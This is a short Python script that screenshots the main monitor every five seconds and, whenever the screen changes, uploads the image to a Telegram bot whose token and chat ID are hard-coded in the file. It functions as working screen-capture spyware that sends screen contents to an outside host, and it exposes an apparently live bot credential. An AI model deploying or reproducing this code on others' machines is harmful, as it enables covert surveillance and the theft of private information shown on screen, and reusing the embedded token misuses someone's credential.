import time
import hashlib
import requests
from mss import mss
from PIL import Image
import io
import os

BOT_TOKEN = "8756129429:AAGB9oU3GawFGLj4FMox5D1Lra3C6MGfTRg"
CHAT_ID = "1299401914"

def capture_screen():
    with mss() as sct:
        monitor = sct.monitors[1]
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
        return img

def get_image_hash(img):
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return hashlib.md5(buf.getvalue()).hexdigest()

def send_to_telegram(img):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)

    requests.post(
        url,
        data={"chat_id": CHAT_ID},
        files={"photo": buf}
    )

def main():
    last_hash = None

    print("Running screen monitor... (Ctrl+C to stop)")

    while True:
        try:
            img = capture_screen()
            current_hash = get_image_hash(img)

            # only send if screen changed
            if current_hash != last_hash:
                send_to_telegram(img)
                last_hash = current_hash
                print("Screen changed → sent")

            time.sleep(5)  # check every 5 seconds

        except Exception as e:
            print("Error:", e)
            time.sleep(5)

if __name__ == "__main__":
    main()